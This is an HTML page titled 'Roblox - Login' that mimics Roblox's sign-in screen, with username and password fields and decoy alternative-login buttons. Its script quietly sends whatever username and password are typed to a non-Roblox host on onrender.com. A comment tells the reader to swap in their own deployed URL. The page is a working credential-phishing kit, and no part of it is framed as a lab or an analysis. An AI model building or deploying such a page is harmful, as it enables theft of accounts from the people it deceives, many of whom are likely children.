<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox - Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      background: #1b1b1b;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    /* Container */
    .login-container {
      background: #2a2c33;
      padding: 40px;
      border-radius: 10px;
      width: 360px;
    }

    .login-container h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 24px;
      font-weight: bold;
    }

    .input-box {
      margin-bottom: 15px;
    }

    .input-box input {
      width: 100%;
      padding: 12px;
      border-radius: 6px;
      border: 1px solid #444;
      background: #3a3c43;
      color: #fff;
      font-size: 14px;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      border-radius: 6px;
      border: none;
      background: #4a4d55;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-btn:hover {
      background: #5a5d66;
    }

    .links {
      margin: 15px 0;
      text-align: center;
      font-size: 14px;
    }

    .links a {
      color: #fff;
      text-decoration: underline;
    }

    .alt-login {
      border-top: 1px solid #444;
      margin: 20px 0;
      padding-top: 15px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .alt-login button {
      padding: 12px;
      border-radius: 6px;
      border: none;
      background: #4a4d55;
      color: #fff;
      cursor: pointer;
    }

    .alt-login button:hover {
      background: #5a5d66;
    }

    .signup {
      text-align: center;
      font-size: 14px;
    }

    .signup a {
      color: #00a2ff;
      text-decoration: none;
    }
  </style>
</head>
<body>

<div class="login-container">
  <h2>Login to Roblox</h2>
  <form id="loginForm">
    <div class="input-box">
      <input type="text" id="username" placeholder="Username/Email/Phone" required>
    </div>
    <div class="input-box">
      <input type="password" id="passcode" placeholder="Password" required>
    </div>
    <button class="login-btn" type="submit">Log In</button>
  </form>

  <div class="links">
    <a href="#">Forgot Password or Username?</a>
  </div>

  <div class="alt-login">
    <button>Email Me a One-Time Code</button>
    <button>Log In With Passkey</button>
    <button>Use Another Device</button>
  </div>

  <div class="signup">
    Don't have an account? <a href="#">Sign Up</a>
  </div>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    const username = document.getElementById("username").value;
    const passcode = document.getElementById("passcode").value;
  
    // Replace localhost with your deployed Render URL
    const res = await fetch("https://roblox-07h6.onrender.com/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, passcode })
    });
  
    const data = await res.json();
    alert(data.message);
  
    document.getElementById("username").value = "";
    document.getElementById("passcode").value = "";
  });
  </script>
  

</body>
</html>
